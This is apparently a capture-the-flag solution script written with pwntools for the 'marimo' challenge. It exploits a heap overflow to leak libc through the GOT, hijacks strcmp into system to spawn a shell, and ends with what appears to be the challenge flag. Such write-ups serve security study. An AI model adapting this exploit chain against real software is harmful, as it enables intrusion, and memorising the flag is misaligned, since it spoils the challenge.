#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools

context.arch = "amd64"
elf = ELF("./marimo")

if args.REMOTE:
    r = remote("ch41l3ng3s.codegate.kr", 3333)
else:
    r = process("./marimo")

libc = ELF("../../libc.so.6")

def new(name, profle):
    r.sendlineafter(">> ", "show me the marimo")
    r.sendlineafter(">> ", name)
    r.sendlineafter(">> ", profle)

def modify(num, profile):
    r.sendlineafter(">> ", "V")
    r.sendlineafter(">> ", str(num))
    r.sendlineafter(">> ", "M")
    r.sendlineafter(">> ", profile)
    r.sendlineafter(">> ", "B")

new("0", "oooo")
new("1", "xxxx")

sleep(2) # size incresed

# heap overflow
"""
0x00605470 : 6f 6f 6f 6f 00 00 00 00 00 00 00 00 00 00 00 00   oooo............
0x00605480 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x00605490 : 00 00 00 00 00 00 00 00 21 00 00 00 00 00 00 00   ........!.......

0x006054a0 : ad ac 77 5a 01 00 00 00 c0 54 60 00 00 00 00 00   ..wZ.....T`.....
0x006054b0 : e0 54 60 00 00 00 00 00 21 00 00 00 00 00 00 00   .T`.....!.......
0x006054c0 : 30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0...............
0x006054d0 : 00 00 00 00 00 00 00 00 31 00 00 00 00 00 00 00   ........1.......
0x006054e0 : 78 78 78 78 00 00 00 00                           xxxx....
"""
modify(0, flat(
    "A" * 56,
    elf.got["puts"], # name
    elf.got["strcmp"], # profile
))

# leak
r.sendlineafter(">> ", "V")
r.sendlineafter(">> ", "1")
r.recvuntil("name : ")
libc.address = u64(r.recvline(False).ljust(8, "\x00")) - libc.sym["puts"]
log.info("libc = " + hex(libc.address))
r.sendlineafter(">> ", "B")

# hijack strcmp
modify(1, flat(
    libc.sym["system"],
    libc.sym["time"],
))

r.sendlineafter(">> ", "/bin/sh")
r.interactive()


# But_every_cat_is_more_cute_than_Marimo
